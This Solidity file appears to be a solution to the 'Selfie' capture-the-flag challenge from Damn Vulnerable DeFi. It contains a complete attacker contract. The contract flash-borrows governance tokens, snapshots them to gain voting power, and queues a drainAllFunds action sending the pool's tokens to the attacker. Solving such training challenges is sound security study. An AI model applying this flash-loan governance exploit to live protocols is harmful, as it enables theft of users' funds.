// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "../selfie/SelfiePool.sol";
import "../selfie/SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";
import "@openzeppelin/contracts/utils/Address.sol";


/**
 * @title Attacker
 * @author kyrers
 * @notice This contract executes the full attack. We do need to begin and finalize the attack, because we need to wait 2 days between both calls.
 */

contract SelfieAttacker {
    DamnValuableTokenSnapshot public immutable dvlTokenSnapshot;
    SelfiePool private immutable selfiePool;
    SimpleGovernance private immutable governance;
    address public attacker;
    uint256 actionId;

    constructor (address _token, address _pool, address _governance) {
        dvlTokenSnapshot = DamnValuableTokenSnapshot(_token);
        selfiePool = SelfiePool(_pool);
        governance = SimpleGovernance(_governance);
        attacker = msg.sender;
    }

    /**
    * @notice Begin the attack by calling the flashloan function to get enough DVL tokens to queue an action
    */
    function beginAttack() external {
        selfiePool.flashLoan(1500000 ether);
    }

    /**
    * @notice Finalize the attack by executing the queued action
    */
    function finalizeAttack() external {
        governance.executeAction(actionId);
    }

    /**
    * @notice Receive the flashloan, take a snapshot, queue the action to drain all funds to the attacker and pay the flashloan back.
    */
    function receiveTokens(address, uint256 _amount) external {
        dvlTokenSnapshot.snapshot();
        actionId = governance.queueAction(address(selfiePool), abi.encodeWithSignature("drainAllFunds(address)", attacker), 0);
        dvlTokenSnapshot.transfer(address(selfiePool), _amount);
    }
}
